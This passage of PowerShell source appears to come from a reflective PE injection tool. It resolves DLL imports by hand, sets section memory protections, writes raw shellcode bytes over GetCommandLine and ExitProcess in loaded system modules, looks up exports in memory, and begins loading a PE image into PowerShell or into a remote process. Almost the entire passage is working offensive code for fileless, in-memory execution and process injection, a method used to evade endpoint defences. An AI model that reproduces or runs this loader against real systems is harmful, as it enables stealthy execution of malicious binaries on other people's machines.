				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				Write-Verbose "Importing $ImportDllPath"
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
					#Write-Verbose "Imported $ImportDllPath to remote process"
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
					#Write-Verbose "Imported $ImportDllPath"
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
						
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
